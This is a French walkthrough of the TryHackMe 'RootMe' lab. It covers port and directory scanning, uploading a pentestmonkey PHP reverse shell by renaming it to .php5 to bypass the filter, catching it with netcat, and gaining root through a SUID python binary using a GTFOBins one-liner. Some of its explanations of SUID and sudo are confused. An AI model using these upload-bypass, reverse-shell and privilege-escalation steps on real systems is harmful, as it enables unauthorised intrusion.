# **[ROOTME](https://tryhackme.com/r/room/rrootme)**

## TACHE 1 - Deploy the machine

Suivez simplement les instructions pour déployer la machine virtuelle.

## TACHE 2 - Reconnaissance
<pre>
First, let's get information about the target.
Commençons par obtenir des informations sur la cible.
</pre>

### Question 1
<pre>
Scan the machine, how many ports are open ?
Scannez la machine, combien de ports sont ouverts ?
</pre>

### Question 2
<pre>
What version of Apache is running?
Quelle version d'Apache est active?
</pre>

### Question 3
<pre>
What service is running on port 22?
Quel service est exécuté sur le port 22?
</pre>

J'ai regroupé les trois premières questions car nous pouvons y répondre avec une seule commande.

<br>

> [!TIP]
> Question Hint
>
> Use nmap to do a port scan.
> <br>Utilisez nmap pour effectuer le scanne de port

<br>En cherchant dans le manuel de la commande `nmap`, on voit que l'option `-sV` permet de scanner les ports ouverts et d'afficher les informations relatives aux services ainsi comme leur version:

```bash
nmap -sV IP_VPN
```
<br>

> [!WARNING]
> Adaptez la commande à l'adresse IP de VOTRE machine virtuelle. Elle change à chaque connexion, il est donc peu probable qu'elle soit identique à la mienne au moment où j'écris ce guide.

<br>

<pre>
Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-29 17:40 BST
Nmap scan report for ip-10-10-201-117.eu-west-1.compute.internal (IP_VPN)
Host is up (0.00044s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:8A:6B:B6:83:3D (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
</pre>

<pre>
Réponse 1: <b>*</b>
Réponse 2: <b>*.*.**</b>
Réponse: <b>***</b>
</pre>

<br>

### Question 4
<pre>
What is the hidden directory?
Quel est le repertoire caché?
</pre>

Pour répondre à cette question, utilisez l'astuce qui ne nécessite pas de réponse:

<br>

> [!TIP]
> gobuster dir -u IP_VPN -w WORDLIST_PATH

<br>Remplacez `IP_VPN` par l'IP de votre machine distante et `WORDLIST_PATH` par le chemin de l'un des wordlists, qui, pour Gobuster, se trouvent dans: `/usr/share/wordlists/dirbuster/`:

```bash
gobuster dir -u IP_VPN -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```
<pre>
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://IP_VPN
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/08/29 17:43:39 Starting gobuster
===============================================================
/panel (Status: 301)
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
===============================================================
2024/08/29 17:43:54 Finished
===============================================================
</pre>

<pre>
-----> <b>/*****/</b>
</pre>

<br><br>

## TACHE 3 - Getting a Shell
<pre>
Find a form to upload and get a reverse shell, and find the flag.
Trouvez un formulaire pour télécharger et obtenir un shell inversé et trouvez le drapeau.
</pre>

<br>

> [!TIP]
> Search for "file upload bypass" and "PHP reverse shell".
> <br>Recherchez "file upload bypass" et "PHP reverse shell".

<br>Commencez par ouvrir Firefox sur la machine distante et rentrez l'IP du VPN:

<pre>
http://IP_VPN
</pre>

<br>Vous verrez une page d'accueil avec simplement écrit: 

<pre>
root@rootme:~#
Can you root me?
</pre>

<br>Vous ne pouvez rien faire sur la page d'accueil mais il est toujours bon de regarder ce qui se cache dans le code-source avec `CTRL+U`:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/home.css">
    <script src="js/maquina_de_escrever.js"></script>
    <title>HackIT - Home</title>
</head>
<body>
    <div class="main-div">
        <p class="title">root@rootme:~#</p>
        <p class="description">
            Can you root me?
        </p>
    </div>

    <!--  -->

    <script>
        const titulo = document.querySelector('.title');
        typeWrite(titulo);
    </script>
</body>
</html>
```

Bon, je n'ai jamais dit que c'était toujours intéressant mais c'est un réflexe à avoir systématiquement.

Rendons-nous dans le dossier caché que nous avons découvert avec Gobuster toute à l'heure:

<pre>
http://IP_VPN/dossier_caché
</pre>

<br>Ah, tiens, un formulaire de téléchargement ! Comme conseillé dans l'astuce:

<pre>
Select a file to upload:
Browse... No file selected
Upload
</pre>

Nous allons donc pouvoir uploader un script, plus précisément, un payload de `reverse shell en php` puisque c'est une des contraintes de l'astuce.

Après quelques recherches, il semble qu'il y en ait un qui soit souvent utilisé, celui de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).

Rendez-vous dans le dossier de téléchargement de la machine distante et téléchargez le:

```bash
cd Downloads
```
```bash
git clone https://github.com/pentestmonkey/php-reverse-shell.git
```

<br>Rendez-vous dans le dossier:

```bash
cd php-reverse-shell
```

<br>Il va falloir modifier deux lignes: `IP` et `PORT` du fichier `php-reverse-shell.php`, éditez-le avec nano ou vim et cherchez les lignes:

<pre>
[...]
set_time_limit (0);
$VERSION = "1.0";
<b>$ip = '&lt;IP_ATTACKBOX&gt;';  // CHANGE THIS
$port = &lt;VOTRE_PORT&gt;;    // CHANGE THIS</b>
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
[...]
</pre>

<br>

> [!NOTE]
> `IP`: Il s'agit de l'IP de l'attaquant, vous, donc soit, celle de l'Attackbox, soit la votre si vous utilisez le VPN
> <br>`PORT`: Mettez celui que vous vous, tant qu'il n'est pas déjà pris comme le `80` ou le `22`, par exemple.

<br> Maintenant, rendez le fichier exécutable:

```bash
chmod +x php-reverse-shell.php
```

<br>Vous pouvez uploader le payload... BIM ! Une erreur !
<pre>
PHP não é permitido!
PHP n'est pas autorisé !
</pre>

Les extensions `.php` ne sont pas autorisées au téléchargement, voyez-vous ça...
<br>Aucun problème, nous allons contourner le système en modifiant l'extension du fichier.

Essayons avec l'extention `.php5`:

```bash
mv php-reverse-shell.php php-reverse-shell.php5
```
<pre>
O arquivo foi upado com sucesso!
Le fichier a été téléchargé avec succès !
</pre>

<br>Pour vérifier que votre fichier a bien été téléchargé, rendez-vous dans le dossier `/uploads` que nous avons vu quand nous avons lancé `Gobuster` au début de l'exercice.

<pre>
http://IP_VPN/uploads/
</pre>

<pre>
Index of /uploads

[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 

[ ]	php-reverse-shell.php5	2024-08-29 16:35 	5.4K	 

Apache/2.4.29 (Ubuntu) Server at IP_VPN Port 80
</pre>

Nous voyons qu'il est bien présent, c'est parfait.

Maintenant que le payload est chargé, retournez dans le Terminal et tapez la commande `netcat` pour entrer dans le `reverse shell`:

```bash
nc -lvnp <VOTRE_PORT>
```

<br>Cliquez sur le script dans firefox pour l'exécuter, vous aurez accès au `reverse shell`:

<pre>
Listening on [0.0.0.0] (family 0, port 1234)
Connection from &lt;IP_ATTACKBOX&gt; 45182 received!
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 19:22:29 up 6 min,  0 users,  load average: 0.07, 0.73, 0.49
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
</pre>

<br>C'est bien, mais il n'est pas stable. Nous allons donc le stabiliser avec un petit script en `Python`.
<br>

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
<pre>
bash-4.4$ 
</pre>

<br>Il vient de passer le shell en `bash`. Maintenant que nous avons accès aux commandes, il ne nous reste plus qu'à trouver le fichier `user.txt`:

```bash
find / -type f -name "user.txt" 2>/dev/null
```

<br>

> [!NOTE]
> On lui demande de:
> - `find`: Trouver
> - `/` : A partir de la racine du système (puisque nous ne savons pas où est le fichier, on prend le plus large possible)
> - `-type f`: Uniquement dans les fichiers
> - `-name "user.txt"`: Celui portant le nom de "user.txt"
> - `2>/dev/null`: Supprime toutes les erreurs de sortie, ici, tous les dossiers auxquels nous n'avons pas accès
>
> <b>IL EST À NOTER</b> que `/dev/null` est un périphérique spécial sous Linux qui supprime toutes les données qui lui sont envoyées, y compris les erreurs d'accès à des dossiers en raisons de l'absence de permissions.

<br>

<pre>
/var/www/user.txt
</pre>

<br>Parfait, il ne nous affiche qu'une ligne. Essayez la commande sans la suppression d'erreurs, vous verrez que c'est tout de suite plus lourd à lire.

Lisez le fichier avec `cat` par exemple:

```bash
cat /var/www/user.txt
```

<pre>
<b>THM{***************}</b>
</pre>

<br>

## TACHE 4 - Privilege escalation
<pre>
Now that we have a shell, let's escalate our privileges to root.
Maintenant que nous disposons d'un shell, nous allons escalader nos privilèges jusqu'à root.
</pre>

### Question 1
<pre>
Search for files with SUID permission, which file is weird?
Recherche de fichiers avec l'autorisation SUID, quel est le fichier bizarre ?
</pre>

<br>

> [!TIP]
> find / -user root -perm /4000

<br>

Utilisons la commande fournie dans l'indice, mais avec la suppression des erreurs pour les même raisons que précédemment: `2>/dev/null`:

```bash
find / -user root -perm /4000 2>/dev/null
```

<br>Pour des raisons pédagogiques et de manière <b>TRÈS EXCEPTIONNELLE</b>, je vais donner la réponse pour pouvoir expliquer pourquoi ce fichier est bizarre alors qu'il est tout à fait normal puisque c'est grâce à lui que nous pouvons exécuter les commandes `Python`:

<pre>
[...]
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
<b>/usr/bin/python</b>
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
[...]
</pre>

<pre>
<b>/usr/bin/python</b>
</pre>

<br>

> [!NOTE]
> Le fait que `Python` se trouve dans la liste des permissions `sudo` implique qu'il a plus de permissions qu'il ne devrait.
> <br>En effet, tous les autres binaires ne peuvent être utilisés que par `sudo` alors que `Python` peut être utiliser par les utillisateurs classiques, il n'a pas besoin de ces permissions.
> <br>C'est donc par lui que nous allons passer élever nos privilèges.

<br>

### Question 2
<pre>
root.txt
</pre>

<br>

> [!TIP]
> Search for gtfobins
> <br>Recherche de gtfobins

<br>Pourquoi escalader nos privilèges ? Tout simplement parce qu'en l'état, il ne nous est pas possible d'accéder au dossier `/root`, qui contient, logiquement, le flag `root.txt`

<pre>
cd root
bash: cd: root: Permission denied
</pre>

<br>Pour savoir comment escalader nos privilèges pour accéder à ce dossier, comme précisé dans l'indice,  il falloir aller consulter le site `GTFOBins` qui référencie tous les binaires Unix qui peuvent être utilisés pour contourner les restrictions de sécurité locales dans des systèmes mal configurés.

Dans la barre de recherche, tapez `python` puis, séléctionnez `SUID`, puisque c'est l'autorisation qu'il nous faut (voir l'indice).

Je vous laisse lire la description. Il nous est dit d'ignorer la première commande, nous allons donc passer à la seconde directement:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<br>

> [!NOTE]
> Nous aurions pu utiliser cette commande dès le départ, du fait de ses autorisations super utilisateur, nous n'aurions pas eu besoin du bloc `2>/dev/null`, mais je voulais donner le plus d'informations possibles.

<br>Maintenant que nous avons le shell super utilisateur, il ne nous reste plus qu'a découvrir le flag:

```bash
cat root/root.txt
```
<pre>
<b>THM{********************}</b>
</pre>

<br>

> [!IMPORTANT]
> **FELICITATIONS, VOUS AVEZ TERMINÉ LA ROOM !**
